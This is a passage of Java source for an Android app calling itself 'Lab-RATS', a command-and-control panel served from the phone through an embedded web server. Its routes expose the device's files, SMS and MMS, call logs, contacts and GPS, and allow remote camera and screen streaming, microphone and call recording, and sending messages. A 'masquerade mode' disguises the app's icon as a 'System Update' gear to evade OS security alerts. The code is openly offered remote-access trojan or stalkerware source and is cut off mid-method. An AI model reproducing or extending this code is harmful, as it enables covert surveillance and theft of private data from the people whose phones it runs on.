package com.labs.labrats;

import android.Manifest;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.hardware.camera2.CameraManager;
import android.location.Location;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.telephony.SmsManager;
import android.util.Log;
import androidx.core.content.ContextCompat;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;
import java.util.HashSet;
import java.util.Set;
import java.util.HashMap;
import java.util.Date;

import java.io.File;
import java.io.FileInputStream;
import java.io.ByteArrayOutputStream;
import java.text.SimpleDateFormat;
import java.util.Locale;
import java.util.Map;

import fi.iki.elonen.NanoHTTPD;

public class LabRatsHttpServer extends NanoHTTPD {

    private final Context context;
    private static final List<String> systemLogs = new java.util.concurrent.CopyOnWriteArrayList<>();

    private static void logActivity(String msg) {
        String timestamp = new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date());
        systemLogs.add(0, "[" + timestamp + "] " + msg);
        if (systemLogs.size() > 50) systemLogs.remove(systemLogs.size() - 1);
    }

    private static final String HTML_HEADER = "<!DOCTYPE html>" +
            "<html lang=\"en\">" +
            "<head>" +
            "<meta charset=\"UTF-8\">" +
            "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">" +
            "<title>Lab-RATS | C2 TERMINAL</title>" +
            "<link href=\"https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Orbitron:wght@400;700&display=swap\" rel=\"stylesheet\">" +
            "<style>" +
            ":root {" +
            "  --neon-cyan: #00f2ff;" +
            "  --neon-green: #39ff14;" +
            "  --neon-yellow: #ffff00;" +
            "  --neon-orange: #ff9d00;" +
            "  --bg-dark: #050505;" +
            "  --bg-card: rgba(15, 15, 25, 0.9);" +
            "  --terminal-green: #00ff41;" +
            "  --danger: #ff3131;" +
            "}" +
            "* { margin: 0; padding: 0; box-sizing: border-box; cursor: url(\"data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='32' height='32' style='font-size: 24px;'><text y='20'>🐀</text></svg>\"), auto; }" +
            "body {" +
            "  font-family: 'JetBrains Mono', monospace;" +
            "  background: var(--bg-dark);" +
            "  background-image: " +
            "    radial-gradient(circle at 50% 50%, rgba(0, 242, 255, 0.03) 0%, transparent 50%)," +
            "    linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.2) 50%)," +
            "    linear-gradient(90deg, rgba(255, 0, 0, 0.03), rgba(0, 255, 0, 0.01), rgba(0, 0, 255, 0.03));" +
            "  background-size: 100% 100%, 100% 4px, 3px 100%;" +
            "  min-height: 100vh;" +
            "  color: #e0e0e0;" +
            "  overflow-x: hidden;" +
            "}" +
            "body::before {" +
            "  content: \" \";" +
            "  display: block;" +
            "  position: fixed;" +
            "  top: 0; left: 0; bottom: 0; right: 0;" +
            "  background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.08) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.02), rgba(0, 255, 0, 0.01), rgba(0, 0, 255, 0.02));" +
            "  z-index: 9999;" +
            "  pointer-events: none;" +
            "  background-size: 100% 2px, 3px 100%;" +
            "}" +
            ".container { max-width: 1200px; margin: 0 auto; padding: 20px; position: relative; z-index: 1; }" +
            ".header {" +
            "  text-align: center;" +
            "  padding: 50px 0;" +
            "  border-bottom: 1px solid rgba(0, 242, 255, 0.3);" +
            "  margin-bottom: 40px;" +
            "  position: relative;" +
            "  overflow: hidden;" +
            "  background: transparent;" +
            "}" +
            ".header h1 {" +
            "  font-family: 'Orbitron', sans-serif;" +
            "  font-size: 3.5rem;" +
            "  color: var(--neon-cyan);" +
            "  text-transform: uppercase;" +
            "  letter-spacing: 12px;" +
            "  margin-right: -12px;" +
            "  text-shadow: 0 0 15px rgba(0, 242, 255, 0.6);" +
            "  margin-bottom: 15px;" +
            "  animation: scanline 8s linear infinite;" +
            "}" +
            "@keyframes scanline { 0% { background-position: 0 0; } 100% { background-position: 0 100%; } }" +
            ".glitch-container { position: relative; margin-top: -10px; margin-bottom: 25px; }" +
            ".glitch { color: #fff; font-size: 0.9rem; font-weight: bold; letter-spacing: 3px; text-transform: uppercase; position: relative; display: inline-block; }" +
            ".glitch::before, .glitch::after { content: attr(data-text); position: absolute; top: 0; left: 0; width: 100%; height: 100%; }" +
            ".glitch::before { left: 2px; text-shadow: -2px 0 var(--neon-cyan); clip: rect(44px, 450px, 56px, 0); animation: glitch-anim 5s infinite linear alternate-reverse; }" +
            ".glitch::after { left: -2px; text-shadow: -2px 0 var(--neon-red); clip: rect(44px, 450px, 56px, 0); animation: glitch-anim2 5s infinite linear alternate-reverse; }" +
            "@keyframes glitch-anim { 0% { clip: rect(31px, 9999px, 94px, 0); } 5% { clip: rect(70px, 9999px, 71px, 0); } 10% { clip: rect(29px, 9999px, 83px, 0); } 15% { clip: rect(16px, 9999px, 91px, 0); } 20% { clip: rect(2px, 9999px, 23px, 0); } 25% { clip: rect(67px, 9999px, 40px, 0); } 30% { clip: rect(56px, 9999px, 49px, 0); } 35% { clip: rect(28px, 9999px, 34px, 0); } 40% { clip: rect(82px, 9999px, 25px, 0); } 45% { clip: rect(21px, 9999px, 53px, 0); } 50% { clip: rect(44px, 9999px, 12px, 0); } 55% { clip: rect(13px, 9999px, 48px, 0); } 60% { clip: rect(54px, 9999px, 97px, 0); } 65% { clip: rect(51px, 9999px, 60px, 0); } 70% { clip: rect(93px, 9999px, 85px, 0); } 75% { clip: rect(38px, 9999px, 8px, 0); } 80% { clip: rect(10px, 9999px, 63px, 0); } 85% { clip: rect(11px, 9999px, 62px, 0); } 90% { clip: rect(87px, 9999px, 79px, 0); } 95% { clip: rect(49px, 9999px, 2px, 0); } 100% { clip: rect(3px, 9999px, 45px, 0); } }" +
            "@keyframes glitch-anim2 { 0% { clip: rect(65px, 9999px, 100px, 0); } 5% { clip: rect(52px, 9999px, 64px, 0); } 10% { clip: rect(90px, 9999px, 73px, 0); } 15% { clip: rect(3px, 9999px, 95px, 0); } 20% { clip: rect(64px, 9999px, 70px, 0); } 25% { clip: rect(74px, 9999px, 4px, 0); } 30% { clip: rect(31px, 9999px, 17px, 0); } 35% { clip: rect(20px, 9999px, 35px, 0); } 40% { clip: rect(47px, 9999px, 9px, 0); } 45% { clip: rect(69px, 9999px, 69px, 0); } 50% { clip: rect(44px, 9999px, 5px, 0); } 55% { clip: rect(1px, 9999px, 81px, 0); } 60% { clip: rect(53px, 9999px, 26px, 0); } 65% { clip: rect(91px, 9999px, 11px, 0); } 70% { clip: rect(73px, 9999px, 100px, 0); } 75% { clip: rect(24px, 9999px, 17px, 0); } 80% { clip: rect(43px, 9999px, 90px, 0); } 85% { clip: rect(61px, 9999px, 1px, 0); } 90% { clip: rect(81px, 9999px, 2px, 0); } 95% { clip: rect(56px, 9999px, 1px, 0); } 100% { clip: rect(4px, 9999px, 54px, 0); } }" +
            ".nav { display: flex; gap: 10px; flex-wrap: wrap; justify-content: center; margin-bottom: 40px; }" +
            ".nav a {" +
            "  padding: 10px 20px;" +
            "  background: rgba(0, 242, 255, 0.03);" +
            "  border: 1px solid rgba(0, 242, 255, 0.2);" +
            "  color: var(--neon-cyan);" +
            "  text-decoration: none;" +
            "  text-transform: uppercase;" +
            "  font-size: 0.75rem;" +
            "  letter-spacing: 1.5px;" +
            "  border-radius: 20px;" +
            "  transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);" +
            "}" +
            ".nav a:hover {" +
            "  background: rgba(0, 242, 255, 0.1);" +
            "  border-color: var(--neon-cyan);" +
            "  box-shadow: 0 0 15px rgba(0, 242, 255, 0.3);" +
            "  transform: translateY(-2px);" +
            "}" +
            ".nav a.logout {" +
            "  color: var(--danger);" +
            "  border-color: rgba(255, 49, 49, 0.3);" +
            "}" +
            ".nav a.logout:hover {" +
            "  background: rgba(255, 49, 49, 0.15);" +
            "  border-color: var(--danger);" +
            "  box-shadow: 0 0 20px rgba(255, 49, 49, 0.4);" +
            "}" +
            ".nav a.active {" +
            "  background: rgba(0, 242, 255, 0.15);" +
            "  border-color: var(--neon-cyan);" +
            "  box-shadow: 0 0 20px rgba(0, 242, 255, 0.5);" +
            "  color: #fff;" +
            "}" +
            ".card {" +
            "  background: var(--bg-card);" +
            "  border: 1px solid rgba(255, 255, 255, 0.05);" +
            "  border-radius: 12px;" +
            "  padding: 35px;" +
            "  margin-bottom: 30px;" +
            "  backdrop-filter: blur(20px);" +
            "  box-shadow: 0 20px 50px rgba(0,0,0,0.4), inset 0 1px 1px rgba(255,255,255,0.05);" +
            "  position: relative;" +
            "}" +
            ".card-node {" +
            "  padding: 30px 20px;" +
            "  border-radius: 12px;" +
            "  text-decoration: none;" +
            "  text-align: center;" +
            "  transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);" +
            "  display: flex;" +
            "  flex-direction: column;" +
            "  align-items: center;" +
            "  justify-content: center;" +
            "  border: 1px solid rgba(255,255,255,0.05);" +
            "  background: rgba(255,255,255,0.01);" +
            "  position: relative;" +
            "  overflow: hidden;" +
            "}" +
            ".card-node:hover {" +
            "  transform: translateY(-10px) scale(1.02);" +
            "  background: rgba(255,255,255,0.03);" +
            "  box-shadow: 0 15px 30px rgba(0,0,0,0.5);" +
            "}" +
            ".card-node .icon {" +
            "  font-size: 2.5rem;" +
            "  margin-bottom: 15px;" +
            "  transition: all 0.3s;" +
            "}" +
            ".card-node:hover .icon {" +
            "  transform: scale(1.2);" +
            "}" +
            "h2, h3 { font-family: 'Orbitron', sans-serif; text-transform: uppercase; letter-spacing: 4px; margin-bottom: 25px; color: var(--neon-cyan); }" +
            "button, .btn {" +
            "  display: inline-block;" +
            "  background: rgba(57, 255, 20, 0.05);" +
            "  border: 1px solid var(--neon-green);" +
            "  color: var(--neon-green);" +
            "  padding: 12px 28px;" +
            "  text-transform: uppercase;" +
            "  letter-spacing: 2px;" +
            "  text-decoration: none;" +
            "  border-radius: 30px;" +
            "  font-weight: bold;" +
            "  transition: all 0.3s;" +
            "  cursor: pointer;" +
            "}" +
            "button:hover, .btn:hover { background: var(--neon-green); color: var(--bg-dark); box-shadow: 0 0 25px var(--neon-green); transform: translateY(-2px); }" +
            ".info-item { background: rgba(0,0,0,0.4); border-radius: 8px; border: 1px solid rgba(255,255,255,0.05); padding: 20px; display: flex; flex-direction: column; overflow: hidden; }" +
            ".info-label { color: var(--neon-cyan); opacity: 0.6; font-size: 0.65rem; text-transform: uppercase; margin-bottom: 8px; letter-spacing: 1px; flex-shrink: 0; }" +
            ".info-value { color: #fff; font-family: 'JetBrains Mono', monospace; font-weight: bold; word-break: break-all; font-size: 0.9rem; }" +
            ".info-section { margin-top: 30px; }" +
            ".info-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; }" +
            ".breadcrumb { margin-bottom: 25px; font-family: 'JetBrains Mono', monospace; font-size: 0.8rem; text-transform: uppercase; letter-spacing: 1px; }" +
            ".breadcrumb a { color: var(--neon-cyan); text-decoration: none; margin: 0 5px; }" +
            ".breadcrumb span { color: #888; }" +
            ".file-list { list-style: none; }" +
            ".file-item { display: flex; align-items: center; padding: 15px; border: 1px solid rgba(255,255,255,0.05); background: rgba(0,0,0,0.2); border-radius: 8px; margin-bottom: 10px; transition: all 0.3s; }" +
            ".file-item:hover { background: rgba(255,255,255,0.05); transform: translateX(5px); border-color: rgba(0, 242, 255, 0.3); }" +
            ".file-icon { font-size: 1.5rem; margin-right: 20px; width: 40px; text-align: center; }" +
            ".file-info { flex-grow: 1; }" +
            ".file-name { color: #fff; text-decoration: none; font-weight: bold; display: block; margin-bottom: 4px; font-size: 0.9rem; }" +
            ".file-meta { font-size: 0.7rem; color: #888; letter-spacing: 1px; }" +
            ".btn-small { padding: 6px 15px; font-size: 0.65rem; border-radius: 20px; }" +
            ".empty-state { text-align: center; padding: 60px 20px; }" +
            ".empty-state .icon { font-size: 4rem; margin-bottom: 20px; opacity: 0.2; color: var(--neon-cyan); }" +
            "table { width: 100%; border-collapse: separate; border-spacing: 0 8px; }" +
            "th { text-align: left; padding: 15px; color: var(--neon-cyan); font-size: 0.7rem; text-transform: uppercase; letter-spacing: 2px; opacity: 0.7; }" +
            "td { padding: 15px; background: rgba(255,255,255,0.03); border-top: 1px solid rgba(255,255,255,0.05); border-bottom: 1px solid rgba(255,255,255,0.05); }" +
            "td:first-child { border-left: 1px solid rgba(255,255,255,0.05); border-radius: 8px 0 0 8px; }" +
            "td:last-child { border-right: 1px solid rgba(255,255,255,0.05); border-radius: 0 8px 8px 0; }" +
            ".call-incoming { color: var(--neon-green); text-shadow: 0 0 5px rgba(57, 255, 20, 0.4); }" +
            ".call-outgoing { color: var(--neon-cyan); text-shadow: 0 0 5px rgba(0, 242, 255, 0.4); }" +
            ".call-missed { color: var(--danger); text-shadow: 0 0 5px rgba(255, 49, 49, 0.4); }" +
            ".pagination { display: flex; justify-content: center; align-items: center; margin-top: 40px; gap: 8px; }" +
            ".pagination a { padding: 10px 18px; background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.1); color: #fff; text-decoration: none; border-radius: 4px; font-size: 0.8rem; transition: all 0.3s; }" +
            ".pagination a:hover, .pagination a.active { background: rgba(0, 242, 255, 0.1); border-color: var(--neon-cyan); color: var(--neon-cyan); box-shadow: 0 0 15px rgba(0, 242, 255, 0.2); }" +
            ".contact-avatar { width: 35px; height: 35px; background: rgba(0, 242, 255, 0.1); border: 1px solid var(--neon-cyan); color: var(--neon-cyan); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 15px; font-weight: bold; font-size: 0.8rem; }" +
            ".back-btn-container { margin-bottom: 25px; }" +
            ".btn-back { display: inline-flex; align-items: center; gap: 8px; background: rgba(0, 242, 255, 0.05); border: 1px solid var(--neon-cyan); color: var(--neon-cyan); padding: 8px 16px; text-decoration: none; border-radius: 4px; font-size: 0.75rem; text-transform: uppercase; letter-spacing: 1px; transition: all 0.3s; }" +
            ".btn-back:hover { background: var(--neon-cyan); color: var(--bg-dark); box-shadow: 0 0 15px var(--neon-cyan); }" +
            ".watermark { position: absolute; top: 50%; left: 20px; transform: translateY(-50%); height: 65%; width: auto; z-index: 10000; opacity: 0.35; pointer-events: none; }" +
            "</style>" +
            "</head>" +
            "<body>" +
            "<div class=\"container\">" +
            "  <div class=\"header\">" +
            "    <img src=\"/logo\" class=\"watermark\" alt=\"LAB-RATS\">" +
            "    <h1>LAB-RATS</h1>" +
            "    <div class=\"glitch-container\">" +
            "      <div class=\"glitch\" data-text=\"DEVELOPED BY K4N3CO.LABS\">DEVELOPED BY K4N3CO.LABS</div>" +
            "    </div>" +
            "    <div style=\"color: var(--neon-cyan); opacity: 0.6; font-size: 0.8rem; letter-spacing: 4px; margin-top: 5px; margin-bottom: 20px;\">C2_TERMINAL_INTERFACE_V1.3.2</div>" +
            "  </div>" +
            "  <div class=\"nav\">" +
            "    <a href=\"/\">Terminal</a>" +
            "    <a href=\"/device\">Hardware</a>" +
            "    <a href=\"/files\">Data</a>" +
            "    <a href=\"/camera\">Optics</a>" +
            "    <a href=\"/gps\">Locate</a>" +
            "    <a href=\"/intel\">Intel</a>" +
            "    <a href=\"/calls\">Comms</a>" +
            "    <a href=\"/sms\">SMS</a>" +
            "    <a href=\"/mms\">MMS</a>" +
            "    <a href=\"/audio\">Acoustics</a>" +
            "    <a href=\"/contacts\">Contacts</a>" +
            "    <a href=\"/logout\" class=\"logout\">Logout</a>" +
            "  </div>";

    private static final String HTML_FOOTER = "</div>" +
            "<script>" +
            "  document.querySelectorAll('.nav a').forEach(link => {" +
            "    const path = window.location.pathname;" +
            "    const href = link.getAttribute('href');" +
            "    if (path === href || (href !== '/' && path.startsWith(href))) {" +
            "      link.classList.add('active');" +
            "    }" +
            "  });" +
            "</script>" +
            "</body>" +
            "</html>";

    private static final String LOGIN_HTML = "<!DOCTYPE html><html><head><title>Lab-RATS | LOGIN</title>" +
            "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">" +
            "<style>" +
            "body { background: #050505; color: #00f2ff; font-family: 'Orbitron', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }" +
            ".login-card { background: rgba(15,15,25,0.9); border: 1px solid #00f2ff; padding: 40px; border-radius: 12px; text-align: center; box-shadow: 0 0 30px rgba(0,242,255,0.2); }" +
            "input { background: #000; border: 1px solid #00f2ff; color: #fff; padding: 12px; margin: 20px 0; width: 100%; border-radius: 4px; outline: none; text-align: center; font-family: monospace; }" +
            "button { background: transparent; border: 1px solid #00f2ff; color: #00f2ff; padding: 12px 30px; cursor: pointer; text-transform: uppercase; letter-spacing: 2px; transition: 0.3s; }" +
            "button:hover { background: #00f2ff; color: #000; box-shadow: 0 0 20px #00f2ff; }" +
            "</style></head><body>" +
            "<div class=\"login-card\">" +
            "<h1>ACCESS_RESTRICTED</h1>" +
            "<form action=\"/login\" method=\"POST\">" +
            "<input type=\"password\" name=\"password\" placeholder=\"ENTER_CREDENTIALS\" autofocus>" +
            "<br><button type=\"submit\">UPLINK</button>" +
            "</form></div></body></html>";

    private String sessionToken = "";

    public LabRatsHttpServer(Context context, int port) {
        super(port);
        this.context = context;
        // Generate a random token on start
        this.sessionToken = java.util.UUID.randomUUID().toString();
    }

    @Override
    public Response serve(IHTTPSession session) {
        String uri = session.getUri();
        
        try {
            if (uri.equals("/login") && session.getMethod() == Method.POST) {
                session.parseBody(new HashMap<>());
                String pass = session.getParms().get("password");
                
                if (pass != null && getStoredPassword().equals(pass.trim())) {
                    logActivity("AUTHENTICATION_SUCCESS: Uplink authorized");
                    Response r = newFixedLengthResponse(Response.Status.REDIRECT, "text/html", "");
                    r.addHeader("Location", "/");
                    r.addHeader("Set-Cookie", "token=" + sessionToken + "; Path=/; HttpOnly");
                    return r;
                }
                return newFixedLengthResponse(Response.Status.OK, "text/html", LOGIN_HTML.replace("ACCESS_RESTRICTED", "INVALID_CREDENTIALS"));
            }

            // Auth Check
            String cookie = session.getCookies().read("token");
            if (cookie == null || !cookie.equals(sessionToken)) {
                if (uri.equals("/login")) return newFixedLengthResponse(Response.Status.OK, "text/html", LOGIN_HTML);
                return newFixedLengthResponse(Response.Status.OK, "text/html", LOGIN_HTML);
            }

            Map<String, String> params = session.getParms();

            if (uri.equals("/") || uri.isEmpty()) {
                return serveHome();
            } else if (uri.equals("/logo")) {
                return serveLogo();
            } else if (uri.equals("/device")) {
                return serveDeviceInfo();
            } else if (uri.equals("/files") || uri.startsWith("/files/")) {
                return serveFiles(uri, params);
            } else if (uri.equals("/calls")) {
                return serveCallLogs(params);
            } else if (uri.equals("/sms")) {
                return serveSmsMessages(params);
            } else if (uri.equals("/mms")) {
                return serveMmsMessages(params);
            } else if (uri.equals("/mms/send")) {
                return sendMms(session);
            } else if (uri.startsWith("/mms/image/")) {
                return serveMmsImage(uri.substring(11));
            } else if (uri.equals("/sms/send")) {
                return sendSms(params);
            } else if (uri.equals("/contacts")) {
                return serveContacts(params);
            } else if (uri.equals("/camera")) {
                return serveCameraPage();
            } else if (uri.equals("/camera/capture")) {
                return serveCameraCapture(params);
            } else if (uri.equals("/camera/photo")) {
                return serveCameraPhoto(params);
            } else if (uri.equals("/camera/live")) {
                return serveLiveStreamPage(params);
            } else if (uri.equals("/camera/stream")) {
                return serveMJPEGStream(params);
            } else if (uri.equals("/camera/frame")) {
                return serveSingleFrame();
            } else if (uri.equals("/camera/start-stream")) {
                return startCameraStream(params);
            } else if (uri.equals("/camera/stop-stream")) {
                return stopCameraStream();
            } else if (uri.equals("/camera/record")) {
                return startVideoRecording(params);
            } else if (uri.equals("/camera/stop-record")) {
                return stopVideoRecording();
            } else if (uri.equals("/camera/status")) {
                return serveCameraStatus();
            } else if (uri.equals("/camera/screen-frame")) {
                return serveScreenFrame();
            } else if (uri.equals("/camera/screen-start")) {
                return startScreenProjection();
            } else if (uri.equals("/camera/flash")) {
                return triggerFlash();
            } else if (uri.equals("/gps")) {
                return serveGpsPage();
            } else if (uri.equals("/gps/locate")) {
                return serveGpsLocate(params);
            } else if (uri.equals("/intel")) {
                return serveIntel();
            } else if (uri.startsWith("/files/edit/")) {
                return serveFileEdit(uri.substring(12));
            } else if (uri.equals("/files/save")) {
                return saveFile(session);
            } else if (uri.equals("/camera/night-mode")) {
                return toggleNightMode();
            } else if (uri.equals("/stealth")) {
                return toggleStealthMode();
            } else if (uri.equals("/settings/password")) {
                return updatePassword(session);
            } else if (uri.startsWith("/download/")) {
                return serveDownload(uri);
            } else if (uri.equals("/audio")) {
                return serveAudioPage();
            } else if (uri.equals("/audio/mic/start")) {
                return startMicRecording(params);
            } else if (uri.equals("/audio/mic/stop")) {
                return stopMicRecording();
            } else if (uri.equals("/audio/call/start")) {
                return startCallRecording(params);
            } else if (uri.equals("/audio/call/stop")) {
                return stopCallRecording();
            } else if (uri.equals("/audio/status")) {
                return serveAudioStatus();
            } else if (uri.equals("/audio/settings")) {
                return updateAudioSettings(params);
            } else if (uri.equals("/audio/recordings")) {
                return serveAudioRecordings();
            } else if (uri.equals("/logout")) {
                Response r = newFixedLengthResponse(Response.Status.REDIRECT, "text/html", "");
                r.addHeader("Location", "/login");
                r.addHeader("Set-Cookie", "token=logged_out; Path=/; Max-Age=0; HttpOnly");
                return r;
            } else {
                return serve404();
            }
        } catch (Exception e) {
            return serveError(e.getMessage());
        }
    }

    private Response serveLogo() {
        try {
            java.io.InputStream is = context.getResources().openRawResource(R.drawable.app_logo);
            ByteArrayOutputStream buffer = new ByteArrayOutputStream();
            int nRead;
            byte[] data = new byte[16384];
            while ((nRead = is.read(data, 0, data.length)) != -1) {
                buffer.write(data, 0, nRead);
            }
            byte[] bytes = buffer.toByteArray();
            Response response = newFixedLengthResponse(Response.Status.OK, "image/png", new java.io.ByteArrayInputStream(bytes), bytes.length);
            response.addHeader("Cache-Control", "public, max-age=31536000"); // Cache for 1 year
            return response;
        } catch (Exception e) {
            return serveError("Logo error: " + e.getMessage());
        }
    }

    private Response serveHome() {
        String ip = MainActivity.getLocalIpAddress();
        String ipDisplay = (ip != null ? ip : "NOT_DETECTED");

        StringBuilder html = new StringBuilder(HTML_HEADER);
        
        // Status Monitor Card
        html.append("<div class=\"card\">");
        html.append("<h2 style=\"margin-bottom: 25px;\">SYSTEM_MONITOR v1.3.2</h2>");
        html.append("<div style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px;\">");
        
        // Server Status
        html.append("<div style=\"padding: 20px; background: rgba(0, 242, 255, 0.05); border: 1px solid var(--neon-cyan); border-left-width: 5px; box-shadow: 0 0 10px rgba(0, 242, 255, 0.1);\">");
        html.append("<div class=\"info-label\">UPLINK_STATUS</div>");
        html.append("<div style=\"font-size: 1.5rem; font-weight: bold; color: var(--neon-cyan); text-shadow: 0 0 5px var(--neon-cyan);\">ONLINE</div>");
        html.append("</div>");
        
        // Port
        html.append("<div style=\"padding: 20px; background: rgba(0, 242, 255, 0.05); border: 1px solid var(--neon-cyan); border-left-width: 5px; box-shadow: 0 0 10px rgba(0, 242, 255, 0.1);\">");
        html.append("<div class=\"info-label\">ACCESS_PORT</div>");
        html.append("<div style=\"font-size: 1.5rem; font-weight: bold; color: var(--neon-cyan); text-shadow: 0 0 5px var(--neon-cyan);\">8080</div>");
        html.append("</div>");
        
        // IP
        html.append("<div style=\"padding: 20px; background: rgba(0, 242, 255, 0.05); border: 1px solid var(--neon-cyan); border-left-width: 5px; box-shadow: 0 0 10px rgba(0, 242, 255, 0.1);\">");
        html.append("<div class=\"info-label\">VIRTUAL_ADDRESS</div>");
        html.append("<div style=\"font-size: 1rem; font-weight: bold; color: var(--neon-cyan); word-break: break-all;\">").append(ipDisplay).append("</div>");
        html.append("</div>");
        
        html.append("</div>");
        html.append("</div>");

        // Security Settings Card
        html.append("<div class=\"card\" style=\"border-left-color: var(--neon-orange);\">");
        html.append("<h3 style=\"font-size: 0.8rem; opacity: 0.7; color: var(--neon-orange);\">CHANGE_INTERFACE_PASSWORD</h3>");
        html.append("<div style=\"margin-top: 15px;\">");
        html.append("<form action=\"/settings/password\" method=\"POST\" style=\"display: flex; gap: 10px; align-items: center; flex-wrap: wrap;\">");
        html.append("<input type=\"password\" name=\"new_password\" placeholder=\"NEW_PASSWORD\" style=\"background: #000; border: 1px solid var(--neon-orange); color: #fff; padding: 10px; border-radius: 4px; outline: none; font-family: monospace; flex-grow: 1; min-width: 200px;\">");
        html.append("<button type=\"submit\" class=\"btn\" style=\"border-color: var(--neon-orange); color: var(--neon-orange); background: rgba(255, 157, 0, 0.05); padding: 10px 20px; font-size: 0.7rem;\">CHANGE_PASSWORD</button>");
        html.append("</form>");
        html.append("</div>");
        html.append("</div>");
        
        // System Log Preview (Cyber effect)
        html.append("<div class=\"card\" style=\"border-left-color: var(--neon-cyan);\">");
        html.append("<h3 style=\"font-size: 0.8rem; opacity: 0.7;\">ACTIVE_SESSION_LOGS</h3>");
        html.append("<div id=\"log-terminal\" style=\"background: #000; padding: 20px; border-radius: 4px; font-size: 0.8rem; color: var(--terminal-green); line-height: 1.8; font-family: 'JetBrains Mono', monospace; height: 300px; overflow-y: auto; border: 1px solid rgba(0, 242, 255, 0.1);\">");
        
        if (systemLogs.isEmpty()) {
            html.append("<div>[WAITING] Uplink established. Bridge active...</div>");
        } else {
            for (String log : systemLogs) {
                html.append("<div>").append(escapeHtml(log)).append("</div>");
            }
        }
        
        html.append("</div>");
        html.append("<div style=\"margin-top: 15px; text-align: right;\">");
        html.append("<button onclick=\"location.reload()\" class=\"btn\" style=\"font-size: 0.65rem; padding: 6px 15px; border-color: rgba(0, 242, 255, 0.3);\">REFRESH_LOGS</button>");
        html.append("</div>");
        html.append("</div>");

        html.append(HTML_FOOTER);
        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
    }

    private Response serveDeviceInfo() {
        StringBuilder html = new StringBuilder(HTML_HEADER);
        html.append("<div class=\"card\">");
        html.append("<h2 style=\"margin-bottom: 20px;\">Device Information</h2>");
        html.append(DeviceInfo.getDeviceInfoHtml(context));
        html.append("</div>");
        
        html.append("<div class=\"card\" style=\"border-color: var(--neon-orange);\">");
        html.append("<h2 style=\"color: var(--neon-orange);\">STEALTH_OPERATIONS</h2>");
        html.append("<p style=\"color: #888; margin-bottom: 20px;\">Manage app visibility. <b>Masquerade Mode</b> replaces the app icon with a generic 'System Update' gear to bypass OS security alerts. Use *#1337# to restore immediately.</p>");
        
        html.append("<div style=\"display: flex; gap: 15px;\">");
        html.append("<button onclick=\"toggleStealth()\" class=\"btn\" style=\"border-color: var(--neon-orange); color: var(--neon-orange); background: rgba(255, 157, 0, 0.05);\">TOGGLE_MASQUERADE_MODE</button>");
        html.append("</div>");
        
        html.append("<script>");
        html.append("function toggleStealth() {");
        html.append("  if(confirm('Initiate Stealth Protocol? This will change the app icon to System Update.')) {");
        html.append("    fetch('/stealth').then(r => r.json()).then(d => {");
        html.append("      alert(d.mode === 'masquerade' ? 'MASQUERADE_ACTIVE: Icon replaced with System Update.' : 'STEALTH_DISENGAGED: Main icon restored.');");
        html.append("    });");
        html.append("  }");
        html.append("}");
        html.append("</script>");
        html.append("</div>");

        html.append(HTML_FOOTER);
        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
    }

    private Response serveFiles(String uri, Map<String, String> params) {
        String path = uri.equals("/files") ? "" : uri.substring(7);
        path = path.replace("%20", " ");

        File baseDir = Environment.getExternalStorageDirectory();
        File currentDir = new File(baseDir, path);

        if (!currentDir.exists()) {
            return serve404();
        }

        if (currentDir.isFile()) {
            return serveFileDownload(currentDir);
        }

        StringBuilder html = new StringBuilder(HTML_HEADER);
        html.append("<div class=\"back-btn-container\">");
        html.append("<a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a>");
        html.append("</div>");

        // Breadcrumb Trail
        html.append("<div class=\"breadcrumb\">");
        html.append("<span style=\"color: var(--neon-green); margin-right: 10px;\">root@Lab-RATS:~$</span>");
        html.append("<a href=\"/files\">storage</a>");

        if (!path.isEmpty()) {
            String[] parts = path.split("/");
            StringBuilder pathBuilder = new StringBuilder();
            for (String part : parts) {
                if (!part.isEmpty()) {
                    pathBuilder.append("/").append(part);
                    html.append("<span>/</span>");
                    html.append("<a href=\"/files").append(pathBuilder).append("\">").append(part.toLowerCase()).append("</a>");
                }
            }
        }
        html.append("<span style=\"margin-left: 10px; color: var(--neon-cyan); animation: blink 1s infinite;\">_</span>");
        html.append("</div>");

        html.append("<div class=\"card\">");
        html.append("<div style=\"display: flex; justify-content: space-between; align-items: center; margin-bottom: 25px; border-bottom: 1px solid rgba(0, 242, 255, 0.1); padding-bottom: 15px;\">");
        html.append("<h2 style=\"margin-bottom: 0; font-size: 1.2rem;\">")
            .append(path.isEmpty() ? "SYSTEM_STORAGE" : "DIR: " + currentDir.getName().toUpperCase())
            .append("</h2>");
        html.append("<span style=\"font-size: 0.7rem; color: var(--neon-green); opacity: 0.8;\">MODE: SECURE_ACCESS</span>");
        html.append("</div>");

        File[] files = currentDir.listFiles();
        if (files != null && files.length > 0) {
            html.append("<ul class=\"file-list\">");

            // Sort: folders first, then files
            java.util.Arrays.sort(files, (a, b) -> {
                if (a.isDirectory() && !b.isDirectory())
                    return -1;
                if (!a.isDirectory() && b.isDirectory())
                    return 1;
                return a.getName().compareToIgnoreCase(b.getName());
            });

            for (File file : files) {
                String fileName = file.getName();
                String filePath = path.isEmpty() ? fileName : path + "/" + fileName;
                String icon = getFileIcon(file);
                String iconClass = getFileIconClass(file);

                html.append("<li class=\"file-item\">");
